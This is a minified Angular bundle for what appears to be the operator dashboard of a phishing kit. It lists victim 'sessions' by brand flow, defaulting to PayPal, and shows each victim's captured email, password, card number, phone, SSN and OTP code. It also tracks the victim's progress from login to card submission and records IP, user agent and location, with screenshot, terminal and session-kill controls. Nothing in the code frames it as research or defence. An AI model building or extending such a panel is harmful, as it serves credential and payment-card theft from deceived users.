import{a as z}from"./chunk-PASLHDWU.js";import{a as q}from"./chunk-52FCFL42.js";import"./chunk-O2MIJUKA.js";import{c as R,d as Q,g as $,o as O}from"./chunk-AXZMG5CJ.js";import{$a as y,A as v,Ba as C,E as P,Fa as T,O as o,Pa as p,T as b,Ua as j,V as _,Wa as U,X as c,Z as x,aa as L,ca as V,da as F,ea as n,fa as t,ga as N,ka as h,la as m,ma as u,pb as A,rb as E,t as g,ta as s,u as w,ua as d,va as M,z as f}from"./chunk-65IM4HJ7.js";var B=(r,i)=>i.label;function W(r,i){if(r&1&&(n(0,"div",24)(1,"p",35),s(2),t(),n(3,"p",36),s(4),t()()),r&2){let e=i.$implicit;o(2),d(e.label),o(2),d(e.value||"\u2014")}}function X(r,i){if(r&1&&(n(0,"span",40),s(1),t()),r&2){let e=u().$implicit;o(),d(e.desc)}}function Y(r,i){if(r&1&&(n(0,"div",32),N(1,"div",37),n(2,"span",38),s(3),t(),_(4,X,2,1,"span",39),t()),r&2){let e=i.$implicit;o(),x("bg-slate-900",!e.completed)("border-slate-700",!e.completed)("bg-blue-500",e.completed)("border-blue-500",e.completed),o(),x("text-white",e.completed)("text-slate-500",!e.completed),o(),d(e.label),o(),c("ngIf",e.desc)}}function Z(r,i){if(r&1){let e=h();n(0,"div",1)(1,"div",2),m("click",function(){f(e);let l=u();return v(l.close.emit())}),t(),n(2,"div",3)(3,"div",4)(4,"div")(5,"div",5)(6,"span",6),s(7),t(),n(8,"h2",7),s(9),t(),n(10,"span",8),s(11),t()(),n(12,"p",9),s(13),t()(),n(14,"button",10),m("click",function(){f(e);let l=u();return v(l.handleClose())}),n(15,"span",11),s(16,"close"),t()()(),n(17,"div",12)(18,"div",13)(19,"h3",14)(20,"span",15),s(21,"visibility"),t(),s(22," Live View "),t(),n(23,"div",16)(24,"div",17)(25,"span",18),s(26,"image_not_supported"),t(),n(27,"span",19),s(28,"No screenshot available"),t()(),n(29,"div",20)(30,"button",21)(31,"span",22),s(32,"camera_alt"),t(),s(33," Request Screenshot "),t()()()(),n(34,"div",13)(35,"h3",14)(36,"span",15),s(37,"data_object"),t(),s(38," Captured Data "),t(),n(39,"div",23),V(40,W,5,2,"div",24,B),t()(),n(42,"div",13)(43,"h3",14)(44,"span",15),s(45,"devices"),t(),s(46," Device Fingerprint "),t(),n(47,"div",25)(48,"div",26)(49,"span"),s(50,"IP Address:"),t(),n(51,"span",27),s(52),t()(),n(53,"div",26)(54,"span"),s(55,"User Agent:"),t(),n(56,"span",28),s(57),t()(),n(58,"div",26)(59,"span"),s(60,"Location:"),t(),n(61,"span",27),s(62),t()()()(),n(63,"div",29)(64,"h3",30)(65,"span",15),s(66,"history"),t(),s(67," Activity Timeline "),t(),n(68,"div",31),V(69,Y,5,14,"div",32,B),t()()(),n(71,"div",33)(72,"button",34),m("click",function(){f(e);let l=u();return v(l.killSession())}),n(73,"span",22),s(74,"delete_forever"),t(),s(75," Terminate Session "),t(),n(76,"button",21)(77,"span",22),s(78,"terminal"),t(),s(79," Open Terminal "),t()()()()}if(r&2){let e=u();o(),x("opacity-0",e.closing())("opacity-100",!e.closing()),o(),x("translate-x-full",e.closing())("translate-x-0",!e.closing()),o(5),d(e.session.flowIcon||"\u2753"),o(2),d(e.session.flowName||"Unknown Flow"),o(),x("bg-green-500-10",e.isActive())("text-green-400",e.isActive())("bg-slate-700",!e.isActive())("text-slate-400",!e.isActive()),o(),M(" ",e.session.status," "),o(2),d(e.session.id),o(27),F(e.dataItems()),o(12),d(e.session.ip),o(4),c("title",e.session.userAgent),o(),d(e.session.userAgent),o(5),d(e.session.location),o(7),F(e.timelineEvents())}}var I=class r{constructor(){this.close=new P;this.stateService=g(E);this.closing=b(!1);this.isActive=p(()=>this.session?.status?.toLowerCase()==="active"||this.session?.status?.toLowerCase()==="verified");this.dataItems=p(()=>{if(!this.session?.data)return[];let i=this.session.data;return[{label:"Email / Username",value:i.email||i.username},{label:"Password",value:i.password?"\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022":null},{label:"Card Number",value:i.cardNumber?"\u2022\u2022\u2022\u2022 "+i.cardNumber.slice(-4):null},{label:"Phone",value:i.phone},{label:"SSN / ID",value:i.ssn},{label:"OTP Code",value:i.otp}].filter(e=>e.value)});this.timelineEvents=p(()=>{if(!this.session?.data)return[];let i=this.session.data;return[{label:"Session Started",completed:!0,desc:new Date(this.session.timestamp).toLocaleTimeString()},{label:"Login Submitted",completed:!!i.isLoginSubmitted,desc:i.email},{label:"Login Verified",completed:!!i.isLoginVerified},{label:"Phone Verified",completed:!!i.isPhoneVerified,desc:i.phone},{label:"Personal Info",completed:!!i.isPersonalVerified},{label:"Card Submitted",completed:!!i.isCardSubmitted,desc:i.cardNumber?"**** "+i.cardNumber.slice(-4):""},{label:"Flow Complete",completed:!!i.isFlowComplete}]})}handleClose(){this.closing.set(!0),setTimeout(()=>{this.close.emit(),this.closing.set(!1)},300)}killSession(){confirm("Are you sure you want to terminate this session effectively kicking the user out?")&&(alert("Kill command sent (Simulation)"),this.handleClose())}static{this.\u0275fac=function(e){return new(e||r)}}static{this.\u0275cmp=w({type:r,selectors:[["app-session-detail-v2"]],inputs:{session:"session"},outputs:{close:"close"},standalone:!0,features:[C],decls:1,vars:1,consts:[["class","fixed inset-0 z-50 flex justify-end",4,"ngIf"],[1,"fixed","inset-0","z-50","flex","justify-end"],[1,"absolute","inset-0","bg-slate-950/80","backdrop-blur-sm","transition-opacity",3,"click"],[1,"relative","w-full","max-w-2xl","bg-slate-900","border-l","border-slate-800","shadow-2xl","transform","transition-transform","duration-300","flex","flex-col"],[1,"p-6","border-b","border-slate-800","flex","items-start","justify-between","bg-slate-900/50"],[1,"flex","items-center","gap-2","mb-1"],[1,"text-2xl"],[1,"adm-h3","text-white"],[1,"px-2","py-0.5","rounded","text-[10px]","uppercase","font-bold","tracking-wider"],[1,"font-mono","text-xs","text-slate-500"],[1,"adm-btn","adm-btn-ghost","p-1","text-slate-400","hover:text-white",3,"click"],[1,"material-icons"],[1,"flex-1","overflow-y-auto","p-6","space-y-8"],[1,"space-y-3"],[1,"text-xs","font-bold","text-slate-400","uppercase","tracking-wider","flex","items-center","gap-2"],[1,"material-icons","text-sm"],[1,"aspect-video","bg-slate-950","rounded-lg","border","border-slate-800","flex","items-center","justify-center","relative","overflow-hidden","group"],[1,"text-slate-600","flex","flex-col","items-center"],[1,"material-icons","text-4xl","mb-2"],[1,"text-xs"],[1,"absolute","inset-0","bg-black/50","flex","items-center","justify-center","opacity-0","group-hover:opacity-100","transition-opacity"],[1,"adm-btn","adm-btn-primary"],[1,"material-icons","mr-2"],[1,"grid","grid-cols-2","gap-4"],[1,"p-3","bg-slate-800/50","rounded","border","border-slate-700/50"],[1,"p-4","bg-slate-800/30","rounded","border","border-slate-700/50","font-mono","text-xs","text-slate-400","space-y-2"],[1,"flex","justify-between"],[1,"text-white"],[1,"text-white","max-w-[200px]","truncate",3,"title"],[1,"space-y-4","pt-4","border-t","border-slate-800"],[1,"text-xs","font-bold","text-slate-400","uppercase","tracking-wider","flex","items-center","gap-2","px-6"],[1,"px-6","relative","space-y-4","before:absolute","before:left-[35px]","before:top-2","before:bottom-2","before:w-[1px]","before:bg-slate-800"],[1,"relative","pl-8","flex","flex-col"],[1,"p-4","border-t","border-slate-800","bg-slate-900/80","flex","justify-between"],[1,"adm-btn","adm-btn-ghost","text-red-400","hover:bg-red-500/10",3,"click"],[1,"text-[10px]","text-slate-500","uppercase","mb-1"],[1,"text-sm","text-white","font-mono","break-all"],[1,"absolute","left-0","w-2.5","h-2.5","rounded-full","border-2","transform","translate-y-1.5"],[1,"text-sm","font-medium"],["class","text-[10px] text-slate-500",4,"ngIf"],[1,"text-[10px]","text-slate-500"]],template:function(e,a){e&1&&_(0,Z,80,24,"div",0),e&2&&c("ngIf",a.session)},dependencies:[y,U],encapsulation:2})}};var ee=(r,i,e)=>({"bg-blue-500/20":r,"text-blue-400":i,"text-slate-400":e}),te=(r,i,e)=>({"bg-green-500/20":r,"text-green-400":i,"text-slate-400":e});function ie(r,i){if(r&1){let e=h();n(0,"app-session-detail-v2",24),m("close",function(){f(e);let l=u();return v(l.closeDetail())}),t()}if(r&2){let e=u();c("session",e.selectedSession())}}var K=class r{constructor(){this.stateService=g(E);this.statsService=g(z);this.selectedSessionId=b(null);this.searchQuery=b("");this.statusFilter=b("all");this.columns=[{header:"Session ID",field:"id",width:"col-span-2",textClass:"font-mono text-slate-400 text-xs"},{header:"Flow",field:"flow",width:"col-span-2",textClass:"font-medium text-white"},{header:"IP Address",field:"ip",width:"col-span-2",textClass:"font-mono text-slate-300 text-xs"},{header:"Device",field:"device",width:"col-span-2"},{header:"Started",field:"started",width:"col-span-2",type:"time"},{header:"Status",field:"status",width:"col-span-2",type:"status",class:"text-right"}];this.totalSessions=p(()=>this.statsService.stats().totalSessions);this.verifiedSessions=p(()=>this.statsService.stats().verifiedSessions);this.activeToday=p(()=>{let i=new Date().toDateString();return this.stateService.history().filter(e=>new Date(e.timestamp).toDateString()===i).length});this.sessionsData=p(()=>{let i=this.stateService.history(),e=this.searchQuery().toLowerCase(),a=this.statusFilter();return a!=="all"&&(i=i.filter(l=>a==="active"?!l.status||l.status.toLowerCase()!=="verified":a==="verified"?l.status?.toLowerCase()==="verified":!0)),e&&(i=i.filter(l=>l.id.toLowerCase().includes(e)||(l.data?.ip||"").includes(e)||(l.data?.email||"").toLowerCase().includes(e)||(l.data?.username||"").toLowerCase().includes(e))),i.map(l=>{let S=A(l.data?.flowId||"paypal"),k=(l.data?.fingerprint?.userAgent||"").toLowerCase(),D="Desktop";return k.includes("mobile")&&(D="Mobile"),(k.includes("tablet")||k.includes("ipad"))&&(D="Tablet"),{id:l.id.substring(0,12)+"...",rawId:l.id,flow:S?.name||"Unknown",ip:l.data?.ip||"Unknown",device:D,started:new Date(l.timestamp).toLocaleString(),status:l.status||"Active"}})});this.selectedSession=p(()=>{let i=this.selectedSessionId();if(!i)return null;let e=this.stateService.history().find(l=>l.id===i);if(!e)return null;let a=A(e.data?.flowId||"paypal");return{id:e.id,status:e.status||"Active",flowName:a?.name,flowIcon:a?.icon,ip:e.data?.ip||"Unknown",location:e.data?.ipCountry||"Unknown",userAgent:e.data?.fingerprint?.userAgent||"Unknown",data:e.data}})}handleRowClick(i){i&&i.rawId&&this.selectedSessionId.set(i.rawId)}closeDetail(){this.selectedSessionId.set(null)}static{this.\u0275fac=function(e){return new(e||r)}}static{this.\u0275cmp=w({type:r,selectors:[["app-admin-sessions-v2"]],standalone:!0,features:[C],decls:50,vars:24,consts:[[1,"space-y-6"],[1,"flex","flex-col","md:flex-row","md:items-center","justify-between","gap-4"],[1,"adm-h2","text-white"],[1,"text-slate-400","text-sm","mt-1"],[1,"flex","flex-wrap","gap-2","items-center"],[1,"relative"],[1,"material-icons","absolute","left-3","top-1/2","-translate-y-1/2","text-slate-500","text-sm"],["type","text","placeholder","Search IP, ID, User...",1,"bg-slate-800/50","border","border-slate-700","text-white","text-xs","rounded-full","pl-9","pr-4","py-2","w-64","focus:outline-none","focus:border-blue-500/50","transition-colors",3,"ngModelChange","ngModel"],[1,"flex","gap-1","bg-slate-800/50","p-1","rounded-lg","border","border-slate-700"],[1,"px-3","py-1","rounded","text-xs","font-medium","transition-all",3,"click"],[1,"px-3","py-1","rounded","text-xs","font-medium","transition-all",3,"click","ngClass"],[1,"adm-btn","adm-btn-primary","shadow-lg","shadow-blue-500/20"],[1,"material-icons","mr-2","text-[18px]"],[1,"grid","grid-cols-1","md:grid-cols-3","gap-4"],[1,"adm-card","p-4","flex","items-center","justify-between","bg-gradient-to-br","from-slate-900","to-slate-900/50"],[1,"text-xs","text-slate-500","uppercase","font-bold"],[1,"text-2xl","font-bold","text-white","mt-1"],[1,"material-icons","text-slate-700","text-4xl"],[1,"text-2xl","font-bold","text-blue-400","mt-1"],[1,"material-icons","text-blue-900/50","text-4xl"],[1,"text-2xl","font-bold","text-emerald-500","mt-1"],[1,"material-icons","text-emerald-900/50","text-4xl"],[3,"onRowClick","title","columns","data"],[3,"session"],[3,"close","session"]],template:function(e,a){e&1&&(n(0,"div",0)(1,"div",1)(2,"div")(3,"h2",2),s(4,"Session Management"),t(),n(5,"p",3),s(6,"Monitor and manage active and past user sessions."),t()(),n(7,"div",4)(8,"div",5)(9,"span",6),s(10,"search"),t(),n(11,"input",7),m("ngModelChange",function(S){return a.searchQuery.set(S)}),t()(),n(12,"div",8)(13,"button",9),m("click",function(){return a.statusFilter.set("all")}),s(14," All "),t(),n(15,"button",10),m("click",function(){return a.statusFilter.set("active")}),s(16," Active "),t(),n(17,"button",10),m("click",function(){return a.statusFilter.set("verified")}),s(18," Verified "),t()(),n(19,"button",11)(20,"span",12),s(21,"file_download"),t(),s(22," Export "),t()()(),n(23,"div",13)(24,"div",14)(25,"div")(26,"p",15),s(27,"Total Sessions"),t(),n(28,"p",16),s(29),t()(),n(30,"span",17),s(31,"storage"),t()(),n(32,"div",14)(33,"div")(34,"p",15),s(35,"Verified"),t(),n(36,"p",18),s(37),t()(),n(38,"span",19),s(39,"verified"),t()(),n(40,"div",14)(41,"div")(42,"p",15),s(43,"Active Today"),t(),n(44,"p",20),s(45),t()(),n(46,"span",21),s(47,"today"),t()()(),n(48,"app-data-table-v2",22),m("onRowClick",function(S){return a.handleRowClick(S)}),t(),_(49,ie,1,1,"app-session-detail-v2",23),t()),e&2&&(o(11),c("ngModel",a.searchQuery()),o(2),x("bg-slate-700",a.statusFilter()==="all")("text-white",a.statusFilter()==="all")("text-slate-400",a.statusFilter()!=="all"),o(2),c("ngClass",T(16,ee,a.statusFilter()==="active",a.statusFilter()==="active",a.statusFilter()!=="active")),o(2),c("ngClass",T(20,te,a.statusFilter()==="verified",a.statusFilter()==="verified",a.statusFilter()!=="verified")),o(12),d(a.totalSessions()),o(8),d(a.verifiedSessions()),o(8),d(a.activeToday()),o(3),c("title","All Sessions")("columns",a.columns)("data",a.sessionsData()),o(),L(a.selectedSession()?49:-1))},dependencies:[y,j,O,R,Q,$,q,I],encapsulation:2})}};export{K as SessionsComponent};
